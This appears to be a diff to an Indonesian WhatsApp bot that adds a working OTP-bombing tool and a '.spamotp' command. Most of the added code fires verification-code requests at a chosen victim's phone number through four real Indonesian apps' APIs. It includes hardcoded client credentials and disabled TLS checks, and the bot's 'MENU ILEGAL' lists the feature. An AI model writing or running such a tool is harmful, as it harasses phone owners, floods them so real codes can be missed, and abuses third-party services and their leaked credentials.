@@ -881,7 +881,435 @@ async function spamCode(sock, from, msg, text, isOwner) {
   sockSpam.end();
 }
 
+// ==================== FAJARX REAL OTP SPAMMER v8.0 ====================
+class RealOTPSpammer {
+    constructor(sock) {
+        this.sock = sock;
+        this.activeJobs = new Map(); // Map<jobId, {target, count, sent, running}>
+        this.proxyList = [];
+        this._loadProxies();
+    }
 
+    // 🚀 LOAD PROXY FOR ANONYMITY
+    async _loadProxies() {
+        // Default proxy list untuk testing
+        this.proxyList = [
+            'http://103.152.112.162:80',
+            'http://45.77.56.113:3128',
+            'http://139.59.90.148:3128',
+            'http://178.128.113.118:8080'
+        ];
+    }
+
+    // 🔥 GET RANDOM PROXY
+    _getRandomProxy() {
+        return this.proxyList.length > 0 
+            ? { host: this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[1].replace('//', ''), 
+                port: parseInt(this.proxyList[Math.floor(Math.random() * this.proxyList.length)].split(':')[2]) }
+            : null;
+    }
+
+    // 🎯 RANDOM STRING GENERATOR
+    _generateRandomString(length = 8) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    // 🔧 GENERATE DEVICE ID
+    _generateDeviceId() {
+        const part1 = this._generateRandomString(8);
+        const part2 = this._generateRandomString(4);
+        const part3 = this._generateRandomString(4);
+        const part4 = this._generateRandomString(4);
+        const part5 = this._generateRandomString(12);
+        return `${part1}-${part2}-${part3}-${part4}-${part5}`;
+    }
+
+    // 📱 MOBILE HEADERS
+    _getMobileHeaders() {
+        const userAgents = [
+            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+        ];
+        
+        return {
+            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'Connection': 'keep-alive',
+            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'gzip, deflate'
+        };
+    }
+
+    // ========== REAL API IMPLEMENTATIONS ==========
+
+    // 1. JOGJAKITA TRANSPORT (REAL WORKING)
+    async _spamJogjakitaReal(phoneNumber) {
+        try {
+            const axios = require('axios');
+            const https = require('https');
+            
+            // Format phone
+            let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
+            
+            // Step 1: Get Token
+            const tokenUrl = 'https://aci-user.bmsecure.id/oauth/token';
+            const tokenData = 'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1';
+            
+            const tokenHeaders = {
+                'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            };
+
+            // Create HTTPS agent that ignores SSL cert errors
+            const httpsAgent = new https.Agent({
+                rejectUnauthorized: false
+            });
+
+            const tokenResponse = await axios.post(tokenUrl, tokenData, {
+                headers: tokenHeaders,
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            const accessToken = tokenResponse.data?.access_token;
+            if (!accessToken) {
+                return { success: false, message: "JOGJAKITA: No token" };
+            }
+
+            // Step 2: Send OTP
+            const otpUrl = 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send';
+            const otpPayload = {
+                'phone_user': phone,
+                'primary_credential': {
+                    'device_id': this._generateRandomString(16),
+                    'fcm_token': this._generateRandomString(152),
+                    'id_kota': 0,
+                    'id_user': 0,
+                    'location': '0.0,0.0',
+                    'uuid': this._generateDeviceId(),
+                    'version_code': '501',
+                    'version_name': '6.10.1',
+                    'via': 'jogjakita_user'
+                },
+                'uuid': this._generateDeviceId(),
+                'version_code': '501',
+                'version_name': '6.10.1',
+                'via': 'jogjakita_user'
+            };
+
+            const otpHeaders = {
+                'Content-Type': 'application/json; charset=UTF-8',
+                'Authorization': `Bearer ${accessToken}`
+            };
+
+            const otpResponse = await axios.post(otpUrl, otpPayload, {
+                headers: otpHeaders,
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            if (otpResponse.status === 200 && otpResponse.data?.rc === '200') {
+                return { success: true, message: "JOGJAKITA: OTP Terkirim" };
+            }
+            
+            return { success: false, message: "JOGJAKITA: Gagal" };
+            
+        } catch (error) {
+            return { success: false, message: `JOGJAKITA: ${error.message}` };
+        }
+    }
+
+    // 2. ADIRAKU FINANCE (REAL WORKING)
+    async _spamAdirakuReal(phoneNumber) {
+        try {
+            const axios = require('axios');
+            const https = require('https');
+            
+            let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
+            
+            const url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata';
+            const payload = {
+                'mobileNumber': phone,
+                'type': 'prospect-create', 
+                'channel': 'whatsapp'
+            };
+
+            const httpsAgent = new https.Agent({
+                rejectUnauthorized: false
+            });
+
+            const response = await axios.post(url, payload, {
+                headers: this._getMobileHeaders(),
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            if (response.status === 200 && response.data?.message === 'success') {
+                return { success: true, message: "ADIRAKU: OTP Terkirim" };
+            }
+            
+            return { success: false, message: "ADIRAKU: Gagal" };
+            
+        } catch (error) {
+            return { success: false, message: `ADIRAKU: ${error.message}` };
+        }
+    }
+
+    // 3. BISATOPUP (REAL WORKING)
+    async _spamBisatopupReal(phoneNumber) {
+        try {
+            const axios = require('axios');
+            const qs = require('qs');
+            const https = require('https');
+            
+            let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
+            
+            const url = 'https://api-mobile.bisatopup.co.id/register/send-verification';
+            const params = {
+                'type': 'WA',
+                'device_id': this._generateRandomString(16),
+                'version_name': '6.12.04', 
+                'version': '61204'
+            };
+            
+            const headers = {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': this._getMobileHeaders()['User-Agent']
+            };
+            
+            const data = qs.stringify({
+                'phone_number': phone
+            });
+
+            const httpsAgent = new https.Agent({
+                rejectUnauthorized: false
+            });
+
+            const response = await axios.post(url, data, {
+                params: params,
+                headers: headers,
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            if (response.status === 200 && response.data && response.data.message && response.data.message.includes('OTP')) {
+                return { success: true, message: "BISATOPUP: OTP Terkirim" };
+            }
+            
+            return { success: false, message: "BISATOPUP: Gagal" };
+            
+        } catch (error) {
+            return { success: false, message: `BISATOPUP: ${error.message}` };
+        }
+    }
+
+    // 4. SPEEDCASH LOAN (REAL WORKING)
+    async _spamSpeedcashReal(phoneNumber) {
+        try {
+            const axios = require('axios');
+            const https = require('https');
+            
+            let phone = phoneNumber.replace(/^0/, '62').replace(/^62/, '62');
+            
+            // Step 1: Get Token
+            const tokenUrl = 'https://sofia.bmsecure.id/central-api/oauth/token';
+            const tokenHeaders = {
+                'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            };
+
+            const httpsAgent = new https.Agent({
+                rejectUnauthorized: false
+            });
+
+            const tokenResponse = await axios.post(tokenUrl, 'grant_type=client_credentials', {
+                headers: tokenHeaders,
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            if (tokenResponse.status !== 200) {
+                return { success: false, message: "SPEEDCASH: Token gagal" };
+            }
+
+            const accessToken = tokenResponse.data?.access_token;
+            if (!accessToken) {
+                return { success: false, message: "SPEEDCASH: No token" };
+            }
+
+            // Step 2: Send OTP
+            const otpUrl = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate';
+            const otpPayload = {
+                'version_name': '6.2.1 (428)',
+                'phone': phone,
+                'appid': 'SPEEDCASH',
+                'version_code': 428,
+                'location': '0,0',
+                'state': 'REGISTER',
+                'type': 'WA',
+                'app_id': 'SPEEDCASH',
+                'uuid': `00000000-4c22-250d-ffff-ffff${this._generateRandomString(8)}`,
+                'via': 'BB ANDROID'
+            };
+
+            const otpHeaders = {
+                'Authorization': `Bearer ${accessToken}`,
+                'Content-Type': 'application/json',
+                'User-Agent': this._getMobileHeaders()['User-Agent']
+            };
+
+            const otpResponse = await axios.post(otpUrl, otpPayload, {
+                headers: otpHeaders,
+                httpsAgent: httpsAgent,
+                timeout: 10000
+            });
+
+            if (otpResponse.status === 200 && otpResponse.data?.rc === '00') {
+                return { success: true, message: "SPEEDCASH: OTP Terkirim" };
+            }
+            
+            return { success: false, message: "SPEEDCASH: Gagal" };
+            
+        } catch (error) {
+            return { success: false, message: `SPEEDCASH: ${error.message}` };
+        }
+    }
+
+    // 🚀 MAIN SPAM FUNCTION
+    async startSpamOTP(targetPhone, count, chatId) {
+        const jobId = Date.now().toString();
+        
+        const services = [
+            this._spamJogjakitaReal.bind(this),
+            this._spamAdirakuReal.bind(this),
+            this._spamBisatopupReal.bind(this),
+            this._spamSpeedcashReal.bind(this)
+        ];
+
+        let sent = 0;
+        let failed = 0;
+        let totalAttempts = 0;
+        
+        this.activeJobs.set(jobId, {
+            target: targetPhone,
+            count: count,
+            sent: 0,
+            failed: 0,
+            running: true
+        });
+
+        try {
+            // Start message
+            await this.sock.sendMessage(chatId, {
+                text: `🚀 *OTP SPAM ATTACK STARTED*\n📱 Target: ${targetPhone}\n🎯 Amount: ${count}x\n📊 Services: 4 WORKING\n\n*WAITING FOR RESULTS...*`
+            });
+
+            for (let round = 1; round <= count && this.activeJobs.get(jobId)?.running; round++) {
+                totalAttempts++;
+                
+                // Status update setiap round
+                await this.sock.sendMessage(chatId, {
+                    text: `📊 *ROUND ${round}/${count}*\n⏳ Processing 4 services...`
+                });
+
+                let roundSuccess = 0;
+                let roundFailed = 0;
+                let roundMessages = [];
+
+                // Run all 4 services in parallel
+                const promises = services.map(service => service(targetPhone));
+                const results = await Promise.allSettled(promises);
+
+                for (let i = 0; i < results.length; i++) {
+                    const result = results[i];
+                    let serviceName = "";
+                    
+                    switch(i) {
+                        case 0: serviceName = "🚕 JOGJAKITA"; break;
+                        case 1: serviceName = "💰 ADIRAKU"; break;
+                        case 2: serviceName = "📱 BISATOPUP"; break;
+                        case 3: serviceName = "💸 SPEEDCASH"; break;
+                    }
+
+                    if (result.status === 'fulfilled' && result.value.success) {
+                        sent++;
+                        roundSuccess++;
+                        roundMessages.push(`✅ ${serviceName}: SUCCESS`);
+                    } else {
+                        failed++;
+                        roundFailed++;
+                        const errorMsg = result.status === 'fulfilled' ? result.value.message : result.reason;
+                        roundMessages.push(`❌ ${serviceName}: ${errorMsg}`);
+                    }
+                }
+
+                // Update job stats
+                const currentJob = this.activeJobs.get(jobId);
+                if (currentJob) {
+                    currentJob.sent = sent;
+                    currentJob.failed = failed;
+                }
+
+                // Send round results
+                await this.sock.sendMessage(chatId, {
+                    text: `📈 *ROUND ${round} RESULTS*\n\n${roundMessages.join('\n')}\n\n✅ Success: ${roundSuccess}/4\n❌ Failed: ${roundFailed}/4\n\n*TOTAL:* ✅ ${sent} | ❌ ${failed}`
+                });
+
+                // Delay between rounds (3-7 seconds)
+                if (round < count) {
+                    const delay = Math.floor(Math.random() * 4000) + 3000;
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+
+            // Final summary
+            const successRate = totalAttempts > 0 ? ((sent / (totalAttempts * 4)) * 100).toFixed(1) : 0;
+            
+            await this.sock.sendMessage(chatId, {
+                text: `🎉 *ATTACK COMPLETED!*\n\n📱 Target: ${targetPhone}\n📊 Total Rounds: ${count}\n✅ Successful OTPs: ${sent}\n❌ Failed Attempts: ${failed}\n📈 Success Rate: ${successRate}%\n\n⚠️ *For authorized testing only!*`
+            });
+
+        } catch (error) {
+            console.error('Spam error:', error);
+            await this.sock.sendMessage(chatId, {
+                text: `❌ *ERROR*\n${error.message}\n\nAttack stopped.`
+            });
+        } finally {
+            this.activeJobs.delete(jobId);
+        }
+
+        return { sent: sent, failed: failed, total: sent + failed };
+    }
+
+    // 📊 GET ACTIVE JOBS
+    getActiveJobs() {
+        return Array.from(this.activeJobs.entries()).map(([id, job]) => ({
+            id,
+            ...job
+        }));
+    }
+
+    // 🛑 STOP JOB (optional)
+    stopJob(jobId) {
+        if (this.activeJobs.has(jobId)) {
+            this.activeJobs.delete(jobId);
+            return true;
+        }
+        return false;
+    }
+}
+
+// ==================== BOT COMMAND INTEGRATION ====================
+
+// Inisialisasi global
+let realSpammer = null;
 
 // ==================== QUANTUMX EXPLOIT SYSTEM ====================
 class QuantumXExploit {
@@ -5545,6 +5973,94 @@ if (body.startsWith('.bug')) {
     
     return;
 }
+
+// Command handler
+if (body.startsWith('.spamotp')) {
+    const args = body.trim().split(' ');
+
+    // Owner check
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘' });
+        return;
+    }
+    
+    if (args.length < 2) {
+        await sock.sendMessage(from, { 
+            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .spamotp <62xxx> <jumlah>\n\nEXAMPLE:\n.spamotp 6281234567890 10\n.spamotp 081234567890 5\n\n*4 WORKING SERVICES:*\n• JOGJAKITA Transport\n• ADIRAKU Finance\n• BISATOPUP\n• SPEEDCASH Loan'
+        });
+        return;
+    }
+
+    // Parse arguments
+    let targetNum = args[1].replace(/[^0-9]/g, '');
+    let count = args.length >= 3 ? parseInt(args[2]) : 5;
+
+    // Validate
+    if (!targetNum) {
+        await sock.sendMessage(from, { text: '❌ *INVALID TARGET*\nFormat: 08xxx atau 62xxx' });
+        return;
+    }
+
+    if (targetNum.startsWith('0')) {
+        targetNum = '62' + targetNum.slice(1);
+    }
+    
+    if (!targetNum.startsWith('62')) {
+        targetNum = '62' + targetNum;
+    }
+
+    if (isNaN(count) || count < 1) {
+        count = 5;
+    }
+    
+    if (count > 50) {
+        count = 50;
+        await sock.sendMessage(from, { text: '⚠️ *LIMIT:* Max 50 rounds, auto-adjusted' });
+    }
+
+    // Initialize spammer if not exists
+    if (!realSpammer) {
+        realSpammer = new RealOTPSpammer(sock);
+        await sock.sendMessage(from, { text: '⚡ *REAL OTP SPAMMER*\n4 WORKING SERVICES READY!' });
+    }
+
+    // Check if already spamming this target
+    const activeJobs = realSpammer.getActiveJobs();
+    const existingJob = activeJobs.find(job => job.target === targetNum);
+    
+    if (existingJob) {
+        await sock.sendMessage(from, { 
+            text: `⚠️ *TARGET ALREADY BEING SPAMMED*\n\nTarget: ${targetNum}\nRounds: ${existingJob.sent + existingJob.failed}/${existingJob.count}\n\nWait for current attack to finish.`
+        });
+        return;
+    }
+
+    // Start the attack
+    await sock.sendMessage(from, { 
+        text: `🎯 *LAUNCHING OTP ATTACK*\n\n📱 Target: ${targetNum}\n🎯 Rounds: ${count}\n⚡ Services: 4 WORKING\n\n*ESTIMATED TIME:* ${count * 10} seconds\n\n*STARTING NOW...*`
+    });
+
+    // Start spam in background
+    setTimeout(async () => {
+        try {
+            const result = await realSpammer.startSpamOTP(targetNum, count, from);
+            
+            // Final report
+            await sock.sendMessage(from, {
+                text: `📊 *FINAL REPORT*\n\n✅ Successful OTPs: ${result.sent}\n❌ Failed: ${result.failed}\n📈 Total Sent: ${result.total}\n\n*TARGET:* ${targetNum}\n*STATUS:* COMPLETED`
+            });
+            
+        } catch (error) {
+            await sock.sendMessage(from, {
+                text: `💀 *CRITICAL ERROR*\n\n${error.message}\n\nAttack terminated.`
+            });
+        }
+    }, 1000);
+    
+    return;
+}
+
+
 // 📝 SET NAMA GRUP – Semua member bisa
 if (text.startsWith('.setnamagc')) {
     if (!from.endsWith('@g.us')) {
@@ -7695,6 +8211,8 @@ ${readmore}╭─〔 🤖 ʙᴏᴛ ᴊᴀʀʀ ᴍᴇɴᴜ 〕─╮
     return;
 }
 
+
+
 // ==================== MENU ILEGAL ====================
 if (body.startsWith('.menuilegal') || body.startsWith('.m')) {
     await sock.sendMessage(from, {
@@ -7708,6 +8226,9 @@ if (body.startsWith('.menuilegal') || body.startsWith('.m')) {
 │
 │  🔥 .ꜱᴘᴀᴍᴄᴏᴅᴇ
 │     ᴏᴛᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜱᴘᴀᴍ
+│
+│  💣 .ꜱᴘᴀᴍᴏᴛᴘ
+│     ʀᴇᴀʟ ᴏᴛᴘ ꜱᴘᴀᴍ (𝟺 ꜱᴇʀᴠɪᴄᴇꜱ)
 │
 └─ 👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`),
     });
